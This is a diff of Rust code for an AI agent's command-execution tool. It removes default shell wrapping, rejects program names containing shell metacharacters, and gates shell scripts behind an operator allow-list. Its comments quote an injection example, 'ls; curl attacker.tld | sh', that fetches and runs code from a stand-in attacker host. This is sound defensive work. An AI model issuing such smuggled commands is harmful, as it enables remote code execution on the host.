@@ -7,33 +7,6 @@ use aura_core::ToolResult;
 use std::path::Path;
 use tracing::{debug, instrument};
 
-/// Quote a single argument for safe inclusion in a shell command string.
-///
-/// On Unix, wraps in single quotes with internal `'` escaped as `'\''`.
-/// On Windows, wraps in double quotes with internal `"` escaped as `\"`.
-/// Arguments that are purely alphanumeric (plus `-._/=:@`) are returned as-is.
-fn shell_quote_arg(arg: &str) -> String {
-    if !arg.is_empty()
-        && arg
-            .bytes()
-            .all(|b| b.is_ascii_alphanumeric() || b"-._/=:@".contains(&b))
-    {
-        return arg.to_string();
-    }
-
-    #[cfg(windows)]
-    {
-        let escaped = arg.replace('"', "\\\"");
-        format!("\"{}\"", escaped)
-    }
-
-    #[cfg(not(windows))]
-    {
-        let escaped = arg.replace('\'', "'\\''");
-        format!("'{}'", escaped)
-    }
-}
-
 /// Result of a threshold-based wait operation.
 ///
 /// When a command is run with a sync threshold:
@@ -46,13 +19,81 @@ pub enum ThresholdResult {
     Pending(std::process::Child),
 }
 
-/// Spawn a shell command and return the child process handle.
+/// Reject any program name that could be interpreted as a shell command.
 ///
-/// This is the low-level spawn operation that doesn't wait for completion.
-/// Use this when you need to manage the process lifecycle yourself.
+/// Used to keep [`cmd_spawn`] safe: even though the default path no
+/// longer wraps invocations in `sh -c` / `cmd.exe /C`, a hostile caller
+/// could still embed metacharacters in `program` and hope the OS falls
+/// back to shell resolution (`CreateProcessW` on Windows, `posix_spawn`
+/// on Unix). Rejecting these characters up front guarantees that what
+/// the caller typed is a bare executable name or path.
 ///
-/// On Windows, commands are run through `cmd.exe /c`.
-/// On Unix, commands are run through `sh -c`.
+/// Rejects:
+/// - Empty strings
+/// - Control characters (`< 0x20` or `0x7F`)
+/// - ASCII whitespace (space, tab)
+/// - Shell metacharacters: `;`, `&`, `|`, `>`, `<`, `$`, backtick, `\`,
+///   `(`, `)`, `{`, `}`, `[`, `]`, `*`, `?`, `#`, `'`, `"`, `\n`, `\r`
+///
+/// On violation returns [`ToolError::InvalidArguments`] describing the
+/// offending character.
+fn validate_program_name(program: &str) -> Result<(), ToolError> {
+    if program.is_empty() {
+        return Err(ToolError::InvalidArguments(
+            "program must not be empty".into(),
+        ));
+    }
+    for c in program.chars() {
+        let code = c as u32;
+        let is_ctrl = code < 0x20 || code == 0x7F;
+        let is_ws = c == ' ' || c == '\t';
+        let is_meta = matches!(
+            c,
+            ';' | '&'
+                | '|'
+                | '>'
+                | '<'
+                | '$'
+                | '`'
+                | '\\'
+                | '('
+                | ')'
+                | '{'
+                | '}'
+                | '['
+                | ']'
+                | '*'
+                | '?'
+                | '#'
+                | '\''
+                | '"'
+                | '\n'
+                | '\r'
+        );
+        if is_ctrl || is_ws || is_meta {
+            return Err(ToolError::InvalidArguments(format!(
+                "program '{program}' contains disallowed character {c:?}; \
+                 use the 'shell_script' field for shell-quoted scripts"
+            )));
+        }
+    }
+    Ok(())
+}
+
+/// Spawn a command directly, WITHOUT routing through a shell interpreter.
+///
+/// `program` is validated via [`validate_program_name`] so that shell
+/// metacharacters cannot sneak in. `args` is passed verbatim to
+/// `Command::args` — individual arguments may contain arbitrary bytes
+/// (including spaces, pipes, semicolons) because they are never
+/// re-parsed by a shell.
+///
+/// Callers that genuinely need a shell (multi-command pipelines, glob
+/// expansion, etc.) must use [`cmd_spawn_shell_script`] and funnel
+/// through `ToolConfig::allowed_shell_scripts`.
+///
+/// Returns the [`Child`](std::process::Child) and a display-only string
+/// suitable for audit logs. The string is not executable by itself.
 #[instrument(skip(sandbox), fields(program = %program))]
 pub fn cmd_spawn(
     sandbox: &Sandbox,
@@ -62,34 +103,23 @@ pub fn cmd_spawn(
 ) -> Result<(std::process::Child, String), ToolError> {
     use std::process::{Command, Stdio};
 
+    validate_program_name(program)?;
+
     let working_dir = match cwd {
         Some(dir) => sandbox.resolve_existing(dir)?,
         None => sandbox.root().to_path_buf(),
     };
 
-    debug!(?working_dir, arg_count = args.len(), "Spawning command");
+    debug!(?working_dir, arg_count = args.len(), "Spawning command (no shell)");
 
-    let full_command = if args.is_empty() {
+    let display = if args.is_empty() {
         program.to_string()
     } else {
-        let quoted_args: Vec<String> = args.iter().map(|a| shell_quote_arg(a)).collect();
-        format!("{} {}", program, quoted_args.join(" "))
+        format!("{} {}", program, args.join(" "))
     };
 
-    #[cfg(windows)]
-    let mut cmd = {
-        use std::os::windows::process::CommandExt;
-        let mut c = Command::new("cmd.exe");
-        c.raw_arg(format!("/C {full_command}"));
-        c
-    };
-
-    #[cfg(not(windows))]
-    let mut cmd = {
-        let mut c = Command::new("sh");
-        c.args(["-c", &full_command]);
-        c
-    };
+    let mut cmd = Command::new(program);
+    cmd.args(args);
 
     #[cfg(windows)]
     {
@@ -108,18 +138,74 @@ pub fn cmd_spawn(
         ToolError::CommandFailed(format!("Failed to spawn command '{program}': {e}"))
     })?;
 
-    Ok((child, full_command))
+    Ok((child, display))
 }
 
-/// Run a shell command with threshold-based execution.
+/// Spawn a raw shell script under `sh -c` / `cmd.exe /C`.
+///
+/// This is the ONLY code path that exposes a shell interpreter to
+/// caller-controlled strings. It is gated by the tool layer behind an
+/// explicit [`ToolConfig::allowed_shell_scripts`][crate::ToolConfig::allowed_shell_scripts]
+/// allow-list; do not call it from other places without applying the
+/// same gate.
+#[instrument(skip(sandbox), fields(shell_script = %shell_script))]
+fn cmd_spawn_shell_script(
+    sandbox: &Sandbox,
+    shell_script: &str,
+    cwd: Option<&str>,
+) -> Result<(std::process::Child, String), ToolError> {
+    use std::process::{Command, Stdio};
+
+    let working_dir = match cwd {
+        Some(dir) => sandbox.resolve_existing(dir)?,
+        None => sandbox.root().to_path_buf(),
+    };
+
+    debug!(?working_dir, "Spawning shell script (opt-in)");
+
+    #[cfg(windows)]
+    let mut cmd = {
+        use std::os::windows::process::CommandExt;
+        let mut c = Command::new("cmd.exe");
+        c.raw_arg(format!("/C {shell_script}"));
+        c
+    };
+
+    #[cfg(not(windows))]
+    let mut cmd = {
+        let mut c = Command::new("sh");
+        c.args(["-c", shell_script]);
+        c
+    };
+
+    #[cfg(windows)]
+    {
+        if let Some(fresh_path) = refresh_system_path() {
+            cmd.env("PATH", fresh_path);
+        }
+        cmd.env("PYTHONUTF8", "1");
+        cmd.env("PYTHONIOENCODING", "utf-8");
+    }
+
+    cmd.current_dir(&working_dir)
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped());
+
+    let child = cmd.spawn().map_err(|e| {
+        ToolError::CommandFailed(format!("Failed to spawn shell script: {e}"))
+    })?;
+
+    Ok((child, shell_script.to_string()))
+}
+
+/// Run a command with threshold-based execution.
 ///
 /// This waits for the command to complete up to `sync_threshold_ms`.
 /// - If the command completes within the threshold, returns `ThresholdResult::Completed`
 /// - If the command is still running after the threshold, returns `ThresholdResult::Pending`
 ///   with the child handle for async tracking
 ///
-/// On Windows, commands are run through `cmd.exe /c`.
-/// On Unix, commands are run through `sh -c`.
+/// The command is spawned directly (no shell wrapping); see [`cmd_spawn`].
 #[instrument(skip(sandbox), fields(program = %program))]
 pub fn cmd_run_with_threshold(
     sandbox: &Sandbox,
@@ -136,13 +222,10 @@ pub fn cmd_run_with_threshold(
     Ok((result, full_command))
 }
 
-/// Run a shell command synchronously with a timeout.
+/// Run a command synchronously with a timeout.
 ///
-/// This is the original synchronous API that waits for completion or kills on timeout.
-/// Use `cmd_run_with_threshold` for async-capable execution.
-///
-/// On Windows, commands are run through `cmd.exe /c`.
-/// On Unix, commands are run through `sh -c`.
+/// Spawns directly (no shell). Use `cmd_run_with_threshold` for
+/// async-capable execution.
 #[instrument(skip(sandbox), fields(program = %program))]
 pub fn cmd_run(
     sandbox: &Sandbox,
@@ -154,6 +237,31 @@ pub fn cmd_run(
     use std::time::Duration;
 
     let (child, _full_command) = cmd_spawn(sandbox, program, args, cwd)?;
+
+    let output = match wait_with_hard_timeout(child, Duration::from_millis(timeout_ms)) {
+        Ok(out) => out,
+        Err(e) => {
+            return Err(ToolError::CommandFailed(format!("Command timed out: {e}")));
+        }
+    };
+
+    output_to_tool_result(output)
+}
+
+/// Run a raw shell script synchronously with a timeout.
+///
+/// See [`cmd_spawn_shell_script`] — the caller is responsible for
+/// enforcing [`ToolConfig::allowed_shell_scripts`][crate::ToolConfig::allowed_shell_scripts]
+/// before invoking this.
+fn cmd_run_shell_script(
+    sandbox: &Sandbox,
+    shell_script: &str,
+    cwd: Option<&str>,
+    timeout_ms: u64,
+) -> Result<ToolResult, ToolError> {
+    use std::time::Duration;
+
+    let (child, _display) = cmd_spawn_shell_script(sandbox, shell_script, cwd)?;
 
     let output = match wait_with_hard_timeout(child, Duration::from_millis(timeout_ms)) {
         Ok(out) => out,
@@ -382,11 +490,31 @@ fn expand_env_vars(input: &str) -> String {
 /// compare the **resolved executable file name** rather than whatever the
 /// caller typed. Called *before* [`cmd_spawn`] in `run_command`.
 ///
-/// An empty allow-list disables the check (backwards-compatible default).
-/// (Wave 5 / T3.2.)
-fn check_binary_allowlist(program: &str, allowlist: &[String]) -> Result<(), ToolError> {
-    if allowlist.is_empty() {
+/// This function now fails **closed**: when `enable_commands == true`
+/// and `allowlist` is empty, the caller's config is considered
+/// mis-configured and the call is rejected with
+/// [`ToolError::Forbidden`]. Previously an empty list short-circuited to
+/// "allowed", which left the command-execution tool effectively
+/// unrestricted by default. (Phase 2 hardening.)
+///
+/// When `enable_commands == false` the allow-list check is skipped
+/// because the dispatcher will have already refused the tool call at a
+/// higher level.
+fn check_binary_allowlist(
+    program: &str,
+    enable_commands: bool,
+    allowlist: &[String],
+) -> Result<(), ToolError> {
+    if !enable_commands {
         return Ok(());
+    }
+
+    if allowlist.is_empty() {
+        return Err(ToolError::Forbidden(
+            "command execution requires a non-empty binary_allowlist; \
+             configure ToolConfig::binary_allowlist"
+                .into(),
+        ));
     }
 
     // When the caller already passes an absolute/relative path, honor it;
@@ -462,14 +590,26 @@ fn check_command_allowlist(command: &str, allowlist: &[String]) -> Result<(), To
     Ok(())
 }
 
-/// `cmd_run` tool: run a shell command.
+/// `run_command` tool: run an external program.
 ///
-/// Accepts two invocation styles:
-/// - `command` (string): a single shell string, shell-wrapped directly
-/// - `program` + `args` (legacy): program name with argument array
+/// Phase 2 hardening: the default invocation form is `program` +
+/// `args`, which is spawned DIRECTLY (no shell wrapping). `program` is
+/// validated against shell metacharacters and whitespace so a hostile
+/// tool proposal like `program = "ls; curl attacker.tld | sh"` is
+/// rejected as [`ToolError::InvalidArguments`] before any process is
+/// spawned.
 ///
-/// Also accepts `working_dir` as alias for `cwd`, and `timeout_secs` as
-/// alternative to `timeout_ms`.
+/// Callers that genuinely need a shell must:
+/// 1. Enable [`ToolConfig::allow_shell`][crate::ToolConfig::allow_shell]
+///    (or pass `allow_shell: true` per-call).
+/// 2. Add their script verbatim to
+///    [`ToolConfig::allowed_shell_scripts`][crate::ToolConfig::allowed_shell_scripts].
+/// 3. Invoke with `shell_script: "<the script>"`.
+///
+/// The `command` (single shell string) form is retained for backward
+/// compatibility but is treated identically to `shell_script` — it
+/// still requires `allow_shell == true` AND presence in
+/// `allowed_shell_scripts`.
 pub struct CmdRunTool;
 
 #[async_trait]
@@ -482,23 +622,28 @@ impl Tool for CmdRunTool {
         ToolDefinition {
             name: "run_command".into(),
             description:
-                "Run a shell command. Accepts either 'command' (shell string) or 'program'+'args'."
+                "Run an external program. Default: pass 'program' + 'args' (no shell). \
+                 Shell scripts require allow_shell=true AND allowed_shell_scripts membership."
                     .into(),
             input_schema: serde_json::json!({
                 "type": "object",
                 "properties": {
-                    "command": {
-                        "type": "string",
-                        "description": "Shell command string (e.g. 'cargo build --release'). Mutually exclusive with program/args."
-                    },
                     "program": {
                         "type": "string",
-                        "description": "The program/command to run (legacy, prefer 'command')"
+                        "description": "Executable name or path. Rejected if it contains whitespace, control chars, or shell metacharacters. Pair with 'args'."
                     },
                     "args": {
                         "type": "array",
                         "items": { "type": "string" },
-                        "description": "Command arguments (used with 'program')"
+                        "description": "Arguments passed verbatim to 'program' (no shell parsing)."
+                    },
+                    "shell_script": {
+                        "type": "string",
+                        "description": "Opt-in shell script (sh -c on Unix, cmd.exe /C on Windows). Requires allow_shell=true AND must appear verbatim in ToolConfig::allowed_shell_scripts. Mutually exclusive with 'program'/'args'."
+                    },
+                    "allow_shell": {
+                        "type": "boolean",
+                        "description": "Per-call opt-in for the shell_script path. Ignored unless the operator also allow-lists the script."
                     },
                     "cwd": {
                         "type": "string",
@@ -541,43 +686,19 @@ impl Tool for CmdRunTool {
                 .unwrap_or(ctx.config.sync_threshold_ms)
         };
 
-        // Per-call override for the legacy shell form. If the caller
-        // explicitly opts in (`allow_shell: true`) we honor it even when
-        // the global config has it disabled — this preserves the escape
-        // hatch for trusted internal callers while keeping the default
-        // deny-by-default. (Wave 5 / T3.1.)
         let allow_shell = args["allow_shell"]
             .as_bool()
             .unwrap_or(ctx.config.allow_shell);
 
-        if let Some(command) = args["command"].as_str() {
-            if !allow_shell {
-                return Err(ToolError::InvalidArguments(
-                    "'command' shell form is disabled; pass the binary as `program` and arguments as `args`, or set `allow_shell: true`".into(),
-                ));
-            }
-            check_command_allowlist(command, &ctx.config.command_allowlist)?;
-            // Best-effort binary allow-list for the shell form: only the
-            // first whitespace token is checked. Callers that need tight
-            // enforcement should switch to program/args.
-            if let Some(first) = command.split_whitespace().next() {
-                check_binary_allowlist(first, &ctx.config.binary_allowlist)?;
-            }
-            let command = command.to_string();
-            let sandbox = ctx.sandbox.clone();
-            return super::spawn_blocking_tool(move || {
-                cmd_run(&sandbox, &command, &[], cwd.as_deref(), timeout_ms)
-            })
-            .await;
-        }
-
-        let program = args["program"]
+        // The legacy `command` field is treated as a shell_script alias
+        // so the same gate applies. Callers shouldn't rely on it; the
+        // field remains only to avoid breaking older tool proposals.
+        let shell_script = args["shell_script"]
             .as_str()
-            .ok_or_else(|| {
-                ToolError::InvalidArguments("missing 'command' or 'program' argument".into())
-            })?
-            .to_string();
+            .or_else(|| args["command"].as_str())
+            .map(String::from);
 
+        let program = args["program"].as_str().map(String::from);
         let cmd_args: Vec<String> = args["args"]
             .as_array()
             .map(|arr| {
@@ -587,17 +708,64 @@ impl Tool for CmdRunTool {
             })
             .unwrap_or_default();
 
-        // `program` with empty `args` is the exact shell-injection surface
-        // `cmd_spawn` treats as a raw shell script. Reject unless the
-        // caller has explicitly opted into the shell form. (Wave 5 / T3.1.)
-        if cmd_args.is_empty() && !allow_shell {
-            return Err(ToolError::InvalidArguments(
-                "empty 'args' is not allowed by default; pass explicit arguments or set `allow_shell: true`".into(),
-            ));
+        if let Some(script) = shell_script {
+            // Shell-script path — strictest gate.
+            if !allow_shell {
+                return Err(ToolError::InvalidArguments(
+                    "'shell_script' requires allow_shell=true (per-call or in ToolConfig)"
+                        .into(),
+                ));
+            }
+            if program.is_some() || !cmd_args.is_empty() {
+                return Err(ToolError::InvalidArguments(
+                    "'shell_script' is mutually exclusive with 'program' / 'args'".into(),
+                ));
+            }
+            if !ctx.config.allowed_shell_scripts.iter().any(|s| s == &script) {
+                return Err(ToolError::Forbidden(
+                    "shell_script not present in ToolConfig::allowed_shell_scripts; \
+                     operator must opt in by listing the script verbatim"
+                        .into(),
+                ));
+            }
+            // Still run allow-list checks against the first token so
+            // an operator who's narrowed `command_allowlist` /
+            // `binary_allowlist` sees consistent behavior.
+            check_command_allowlist(&script, &ctx.config.command_allowlist)?;
+            if let Some(first) = script.split_whitespace().next() {
+                check_binary_allowlist(
+                    first,
+                    ctx.config.enable_commands,
+                    &ctx.config.binary_allowlist,
+                )?;
+            }
+
+            let sandbox = ctx.sandbox.clone();
+            return super::spawn_blocking_tool(move || {
+                cmd_run_shell_script(&sandbox, &script, cwd.as_deref(), timeout_ms)
+            })
+            .await;
         }
 
+        // Direct-execution path (no shell).
+        let program = program.ok_or_else(|| {
+            ToolError::InvalidArguments(
+                "missing 'program' argument; use 'shell_script' for shell commands".into(),
+            )
+        })?;
+
+        // Validate the raw string BEFORE the allow-list checks so that
+        // injection attempts (`"ls; curl attacker | sh"`) surface as
+        // `InvalidArguments` rather than a downstream `which` failure
+        // masquerading as `Forbidden`.
+        validate_program_name(&program)?;
+
         check_command_allowlist(&program, &ctx.config.command_allowlist)?;
-        check_binary_allowlist(&program, &ctx.config.binary_allowlist)?;
+        check_binary_allowlist(
+            &program,
+            ctx.config.enable_commands,
+            &ctx.config.binary_allowlist,
+        )?;
 
         let sandbox = ctx.sandbox.clone();
         super::spawn_blocking_tool(move || {
